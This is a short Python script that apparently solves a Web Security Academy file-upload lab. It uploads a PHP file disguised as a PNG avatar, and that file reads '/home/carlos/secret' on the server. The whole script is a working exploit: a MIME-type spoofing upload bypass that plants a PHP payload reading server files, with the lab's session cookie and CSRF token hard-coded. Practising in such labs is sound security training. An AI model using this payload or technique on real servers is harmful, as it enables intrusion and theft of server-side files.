import requests


lab_url = "https://0aac0058039fa493809599ae00d10040.web-security-academy.net/my-account/avatar"
cookies = {"session": "g6oUm4IxXqU0qGbevry3RpCu7xpUhRqw"}

files = {
    "avatar": (
        "read_file.php",
        "<?php echo file_get_contents('/home/carlos/secret'); ?>",
        "image/png"
    )
}

data = {
    "user": "wiener",
    "csrf": "taEDzAE5qNT3yrmyaEGtOzV3EhDx2ReG"
}

response = requests.post(url=lab_url, cookies=cookies, data=data, files=files)

print(response.text)